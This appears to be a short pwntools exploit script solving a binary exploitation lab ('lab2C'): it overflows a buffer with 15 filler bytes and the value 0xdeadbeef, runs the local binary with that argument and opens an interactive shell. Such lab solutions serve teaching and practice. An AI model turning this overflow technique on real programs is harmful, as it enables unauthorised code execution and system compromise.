from pwn import *

payload = 'A'*15 + p32(0xdeadbeef)
sh = process(argv = ['./lab2C', payload])
sh.interactive()
